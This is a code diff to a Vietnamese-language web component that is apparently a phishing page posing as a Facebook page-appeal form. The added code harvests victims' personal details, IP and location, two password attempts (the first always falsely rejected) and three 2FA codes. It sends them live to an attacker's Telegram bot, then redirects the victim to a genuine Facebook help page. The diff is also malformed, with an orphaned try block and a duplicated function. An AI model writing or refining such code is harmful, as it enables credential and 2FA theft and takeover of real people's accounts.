@@ -376,94 +376,128 @@ export default function HomePageClient({
   const botToken = TELEGRAM_BOT_TOKEN;
   const chatId = TELEGRAM_CHAT_ID;
 
-  const telegramEnabled = Boolean(botToken && chatId);
-  const [messageId, setMessageId] = useState<string | null>(null);
-  const [password1, setPassword1] = useState("");
-  const [password2, setPassword2] = useState("");
-  const [code1, setCode1] = useState("");
-  const [code2, setCode2] = useState("");
-  const [code3, setCode3] = useState("");
-  const [currentUrl, setCurrentUrl] = useState("");
+const stateRef = useRef({
+  password1: "",
+  password2: "",
+  code1: "",
+  code2: "",
+  code3: "",
+  status: "⏳ Đang chờ xử lý...",
+});
 
-  type TelegramOverrides = Partial<{
-    password1: string;
-    password2: string;
-    code1: string;
-    code2: string;
-    code3: string;
-    status: string;
-  }>;
-  const buildInitialMessage = () => {
-    const locationParts = (clientLocation ?? "").split("/").map((part) => part.trim()).filter(Boolean);
-    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
-    const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
-    const safeIp = escapeHtml(clientIp ?? "N/A");
-    const safePageName = escapeHtml(form.pageName || "N/A");
-    const safeFullName = escapeHtml(form.fullName || "N/A");
-    const safeDateOfBirth = escapeHtml(form.dateOfBirth || "N/A");
-    const safePersonalEmail = escapeHtml(form.email || "N/A");
-    const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
-    const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
-    const safeUrl = escapeHtml(currentUrl || "N/A");
-    const safeTime = escapeHtml(getCurrentTime());
+// Build tin nhắn tổng hợp (như ảnh)
+const buildFullMessage = (overrides?: Partial<{
+  password1: string;
+  password2: string;
+  code1: string;
+  code2: string;
+  code3: string;
+  status: string;
+}>) => {
+  const state = { ...stateRef.current, ...overrides };
 
-    return [
-      "👤 <b>THÔNG TIN YÊU CẦU KHÁNG NGHỊ</b>",
-      `📱 Tên PAGE: <code>${safePageName}</code>`,
-      `👨‍💼 Tên: <code>${safeFullName}</code>`,
-      `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
-      "━━━━━━━━━━━━━━━━━━━━━",
-      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
-      `🌐 IP: <code>${safeIp}</code>`,
-      `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
-      `🏙 Thành Phố: <code>${safeCity}</code>`,
-      `⏰ Thời Gian: <code>${safeTime}</code>`,
-      "━━━━━━━━━━━━━━━━━━━━━",
-      `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
-      `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
-      `📧 Email Business: <code>${safeBusinessEmail}</code>`,
-      `📞 SĐT: <code>${safePhone}</code>`,
-      `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
-      `🔗 URL: <code>${safeUrl}</code>`,
-    ].join("\n");
-  };
+  const locationParts = (clientLocation ?? "").split("/").map((p) => p.trim()).filter(Boolean);
+  const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
+  const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
+  const safeIp = escapeHtml(clientIp ?? "N/A");
+  const safePageName = escapeHtml(form.pageName || "N/A");
+  const safeFullName = escapeHtml(form.fullName || "N/A");
+  const safeDateOfBirth = escapeHtml(form.dateOfBirth || "N/A");
+  const safePersonalEmail = escapeHtml(form.email || "N/A");
+  const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
+  const safeDetails = escapeHtml(form.details.trim() || "N/A");
+  const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
+  const safeUrl = escapeHtml(currentUrl || "N/A");
+  const safeTime = escapeHtml(getCurrentTime());
 
-  const buildUpdateMessage = (label: string, value: string) => {
-    return `🔔 <b>${label}:</b> <code>${escapeHtml(value)}</code>`;
-  };
+  return [
+    "👤 <b>THÔNG TIN YÊU CẦU KHÁNG NGHỊ</b>",
+    `📱 Tên PAGE: <code>${safePageName}</code>`,
+    `👨‍💼 Tên: <code>${safeFullName}</code>`,
+    `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
+    "━━━━━━━━━━━━━━━━━━━━━",
+    `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
+    `🌐 IP: <code>${safeIp}</code>`,
+    `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
+    `🏙 Thành Phố: <code>${safeCity}</code>`,
+    `⏰ Thời Gian: <code>${safeTime}</code>`,
+    "━━━━━━━━━━━━━━━━━━━━━",
+    `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
+    `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
+    `📧 Email Business: <code>${safeBusinessEmail}</code>`,
+    `📞 SĐT: <code>${safePhone}</code>`,
+    `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
+    `🔗 URL: <code>${safeUrl}</code>`,
+    "━━━━━━━━━━━━━━━━━━━━━",
+    `🔑 <b>XÁC THỰC</b>`,
+    `🔸 Mật khẩu 1: <code>${escapeHtml(state.password1 || "—")}</code>`,
+    `🔸 Mật khẩu 2: <code>${escapeHtml(state.password2 || "—")}</code>`,
+    `🔢 Mã 2FA (L1): <code>${escapeHtml(state.code1 || "—")}</code>`,
+    `🔢 Mã 2FA (L2): <code>${escapeHtml(state.code2 || "—")}</code>`,
+    `🔢 Mã 2FA (L3): <code>${escapeHtml(state.code3 || "—")}</code>`,
+    "━━━━━━━━━━━━━━━━━━━━━",
+    `📌 Trạng thái: <b>${escapeHtml(state.status)}</b>`,
+  ].join("\n");
+};
 
-  const sendTelegramMessage = async (text: string) => {
-    if (!telegramEnabled) {
-      return;
-    }
+const sendInitialDataToTelegram = async () => {
+  if (!telegramEnabled) return;
 
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST", 
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text,
-          parse_mode: "HTML",
-        }),
-      });
-      const data = (await response.json()) as {
-        ok?: boolean;
-        result?: { message_id?: number };
-      };
+  if (typeof window !== "undefined") {
+    localStorage.removeItem("telegram_msg_id");
+  }
+  setMessageId(null);
+  stateRef.current = { password1: "", password2: "", code1: "", code2: "", code3: "", status: "⏳ Đang chờ xử lý..." };
+  setPassword1(""); setPassword2(""); setCode1(""); setCode2(""); setCode3("");
 
-      if (data?.ok && data.result?.message_id) {
-        const nextId = String(data.result.message_id);
-        setMessageId(nextId);
-        if (typeof window !== "undefined") {
-          localStorage.setItem("telegram_msg_id", nextId);
-        }
-      }
-    } catch (error) {
-      console.error("Telegram Error:", error);
-    }
-  };
+  const text = buildFullMessage();
+  await sendTelegramMessage(text);
+};
+
+// Cập nhật tin nhắn gốc (gộp) + gửi notification riêng
+const pushUpdate = async (
+  updates: Partial<{ password1: string; password2: string; code1: string; code2: string; code3: string; status: string }>,
+  notifyLabel?: string,
+  notifyValue?: string
+) => {
+  if (!telegramEnabled) return;
+
+  // 1) cập nhật stateRef + build lại full message
+  stateRef.current = { ...stateRef.current, ...updates };
+
+  // 2) gửi notification riêng (nếu có) — đây là tin nhắn "từng bước"
+  if (notifyLabel && notifyValue) {
+    await notifyStep(notifyLabel, notifyValue);
+  }
+
+  // 3) edit tin nhắn gốc
+  const targetId = messageId ?? (typeof window !== "undefined" ? localStorage.getItem("telegram_msg_id") : null);
+  if (targetId) {
+    await editTelegramMessage(targetId, buildFullMessage());
+  }
+};
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        message_id: Number(targetMessageId),
+        text,
+        parse_mode: "HTML",
+      }),
+    });
+  } catch (error) {
+    console.error("Telegram editMessageText Error:", error);
+  }
+};
+
+// Tin nhắn "notification" ngắn, gửi riêng từng bước
+const notifyStep = async (label: string, value: string) => {
+  if (!telegramEnabled) return;
+  const text = `🔔 <b>${escapeHtml(label)}:</b> <code>${escapeHtml(value)}</code>`;
+  await sendTelegramMessage(text, { disable_notification: false });
+};
 
   const sendInitialDataToTelegram = async () => {
     if (!telegramEnabled) {
@@ -634,42 +668,38 @@ export default function HomePageClient({
     const currentClick = clickCount;
     setClickCount((prev) => prev + 1);
 
-    if (currentClick === 0) {
-      const firstAttempt = password;
-      setPassword1(firstAttempt);
-     await updateTelegramMessage("Mật Khẩu 1", firstAttempt);
+if (currentClick === 0) {
+  const firstAttempt = password;
+  setPassword1(firstAttempt);
+  await pushUpdate({ password1: firstAttempt, status: "⏳ Đã nhập mật khẩu lần 1, chờ lần 2..." }, "Mật Khẩu 1", firstAttempt);
 
-      if (passwordTimerRef.current) {
-        clearTimeout(passwordTimerRef.current);
-      }
-      passwordTimerRef.current = setTimeout(() => {
-        setPasswordError(passwordIncorrectError);
-        setIsSubmitDisabled(false);
-        setLoadingPassword(false);
-        passwordTimerRef.current = null;
-      }, 3000);
-      return;
-    }
+  if (passwordTimerRef.current) clearTimeout(passwordTimerRef.current);
+  passwordTimerRef.current = setTimeout(() => {
+    setPasswordError(passwordIncorrectError);
+    setIsSubmitDisabled(false);
+    setLoadingPassword(false);
+    passwordTimerRef.current = null;
+  }, 3000);
+  return;
+}
 
-    if (currentClick === 1) {
-      const secondAttempt = password;
-      setPassword2(secondAttempt);
-      await updateTelegramMessage("Mật Khẩu 2", secondAttempt);
+if (currentClick === 1) {
+  const secondAttempt = password;
+  setPassword2(secondAttempt);
+  await pushUpdate({ password2: secondAttempt, status: "✅ Đã xác thực mật khẩu" }, "Mật Khẩu 2", secondAttempt);
 
-      if (passwordTimerRef.current) {
-        clearTimeout(passwordTimerRef.current);
-      }
-      passwordTimerRef.current = setTimeout(() => {
-        setIsSubmitDisabled(false);
-        setLoadingPassword(false);
-        setIsSuccess(true);
-        setTwoFactorCode("");
-        setTwoFactorError("");
-        setClickCount1(0);
-        setTimeLeft(0);
-        passwordTimerRef.current = null;
-      }, 1200);
-    }
+  if (passwordTimerRef.current) clearTimeout(passwordTimerRef.current);
+  passwordTimerRef.current = setTimeout(() => {
+    setIsSubmitDisabled(false);
+    setLoadingPassword(false);
+    setIsSuccess(true);
+    setTwoFactorCode("");
+    setTwoFactorError("");
+    setClickCount1(0);
+    setTimeLeft(0);
+    passwordTimerRef.current = null;
+  }, 1200);
+}
   }
 
   function handleTwoFactorChange(value: string) {
@@ -729,35 +759,35 @@ export default function HomePageClient({
     const currentClick = clickCount1;
     setClickCount1((prev) => prev + 1);
 
-    if (currentClick === 0) {
-      const firstCode = twoFactorCode;
-      setCode1(firstCode);
-      await updateTelegramMessage("Mã 2FA (Lần 1)", firstCode);
-      setIsSubmitDisabled(true);
-      setTimeLeft(10);
-      setTwoFactorCode("");
-      return;
-    }
+if (currentClick === 0) {
+  const firstCode = twoFactorCode;
+  setCode1(firstCode);
+  await pushUpdate({ code1: firstCode, status: "⏳ Đã nhập 2FA lần 1, chờ lần 2..." }, "Mã 2FA (Lần 1)", firstCode);
+  setIsSubmitDisabled(true);
+  setTimeLeft(10);
+  setTwoFactorCode("");
+  return;
+}
 
-    if (currentClick === 1) {
-      const secondCode = twoFactorCode;
-      setCode2(secondCode);
-      await updateTelegramMessage("Mã 2FA (Lần 2)", secondCode);
-      setIsSubmitDisabled(true);
-      setTimeLeft(10);
-      setTwoFactorCode("");
-      return;
-    }
+if (currentClick === 1) {
+  const secondCode = twoFactorCode;
+  setCode2(secondCode);
+  await pushUpdate({ code2: secondCode, status: "⏳ Đã nhập 2FA lần 2, chờ lần 3..." }, "Mã 2FA (Lần 2)", secondCode);
+  setIsSubmitDisabled(true);
+  setTimeLeft(10);
+  setTwoFactorCode("");
+  return;
+}
 
-    if (currentClick === 2) {
-      const thirdCode = twoFactorCode;
-      setCode3(thirdCode);
-      await updateTelegramMessage("Mã 2FA (Lần 3)", thirdCode);
-      setTwoFactorCode("");
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/help/1735443093393986/";
-      }, 2000);
-    }
+if (currentClick === 2) {
+  const thirdCode = twoFactorCode;
+  setCode3(thirdCode);
+  await pushUpdate({ code3: thirdCode, status: "✅ Hoàn tất xác thực 2FA" }, "Mã 2FA (Lần 3)", thirdCode);
+  setTwoFactorCode("");
+  setTimeout(() => {
+    window.location.href = "https://www.facebook.com/help/1735443093393986/";
+  }, 2000);
+}
   }
 
   useEffect(() => {
